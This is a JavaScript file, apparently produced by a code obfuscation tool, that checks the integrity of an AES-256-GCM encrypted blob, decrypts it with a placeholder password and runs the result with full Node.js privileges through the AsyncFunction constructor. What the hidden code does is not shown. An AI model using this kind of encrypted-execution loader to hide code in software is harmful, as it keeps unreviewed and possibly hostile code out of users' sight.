// ╔══════════════════════════════════════════════════════╗
// ║  Obfuscationary by JusticeTech                      ║
// ║  Version  : 3.0.0                                     ║
// ║  Encrypted: 2026-03-19 08:23:29 UTC                   ║
// ║  Cipher   : AES-256-GCM                               ║
// ║  Tamper   : Protected via SHA-256 integrity check    ║
// ╚══════════════════════════════════════════════════════╝

// Encrypted by Obfuscationary by JusticeTech v3.0.0
(async () => {
  if (typeof require === 'undefined') {
    throw new Error('[Obfuscationary] Browser mode not supported for multi-layer. Use Node.js.');
  }

  const _b64            = 'xdyB2h74CtfuaQgb23V3iciVhJUt9k5sVL5WvvPij/47CiFYRZiDHdD1NYhAVs0NoEc7QlbDll1xBMfDVwN8KP4IacMUd3nhUeWVDKmtKzQoTNX1DBI5R5txMANre3XD+unAa+ffQUmYWQoMp4dyvFnMHSb9wVB6E4/lQHT3ik0q5db9OXEEOzTibYx5wK6Rm1HKfBbFIrCqooyUvnZqvc7IYj9oxcfqO1Q569pNplV7llH6m83pA8Xv8iWieltKuT0/whEEeM8UF5pdaeYg4+cRGEFFZNpKowuSjAlr3OKOqyFFQK0QIno2We7yAkXbIxlkjeF/HSvoYoDCO7IhEz4CV/v+elIv3BSoW21aCgIViJhdun4954DQRPjaXPD4F9ojaxrDBVVmPrehJ/ijrBcqjP81o94YbZD74f3KLiN+6COl8omVwRkQJOWYdaKt4MOM7CUV+h2OQ3qPmc1fX2xJsjCD9eiEVxwx2gnExQbzP4Cev3Yp/a3E1l5iYjp1Al9XJP48KKFQjKFa9uhcKTwjZBCkgSE3aQKknjVrCmYIwQC+vYPbbuLQm34ZJGTTv0n0nk3qNnBFoaa4/JIXNX6rcQE2LQSU8dCcEBEFsGzmljQjq7UBK5+5lzWMpkmiiFgwfSLFDED3B46J4t6w9slx1lkAXfeIj8tGLItXDOt5Qqy7hp1sGIkUE7TLsODxXXGUKOe7j0X8GQy5byT7DzLqZMNN7UhNObzz7RQ=';
  const _INTEGRITY_HASH = '4b9545176240159c4c602ff5afb4339c6750ab9ea26242a2a72145b03926fc83';
  let   _src;

  const _PWDS  = ["change_me_to_a_strong_password"];
  const _ITERS = 600000;

  // Integrity check
  const _crypto2 = require('crypto');
  const _actualHash = _crypto2.createHash('sha256').update(_b64).digest('hex');
  if (_actualHash !== _INTEGRITY_HASH) {
    throw new Error('[Obfuscationary] Tamper detected! File integrity check failed.');
  }

  // Multi-layer decrypt (reverse order)
  let _data = Buffer.from(_b64, 'base64');
  for (let _i = _PWDS.length - 1; _i >= 0; _i--) {
    const _pw   = _PWDS[_i];
    const _salt = _data.slice(0, 16);
    const _iv2  = _data.slice(16, 28);
    const _ct2  = _data.slice(28);
    const _ctag2 = _ct2.slice(_ct2.length - 16);
    const _cdat2 = _ct2.slice(0, _ct2.length - 16);
    const _key2  = _crypto2.pbkdf2Sync(_pw, _salt, _ITERS, 32, 'sha256');
    const _dec2  = _crypto2.createDecipheriv('aes-256-gcm', _key2, _iv2);
    _dec2.setAuthTag(_ctag2);
    _data = Buffer.concat([_dec2.update(_cdat2), _dec2.final()]);
  }
  _src = _data.toString('utf8');

  const _Fn = Object.getPrototypeOf(async function(){}).constructor;
  await _Fn('module', 'exports', 'require', '__filename', '__dirname', _src)(
    module, exports, require, __filename, __dirname
  );
})();
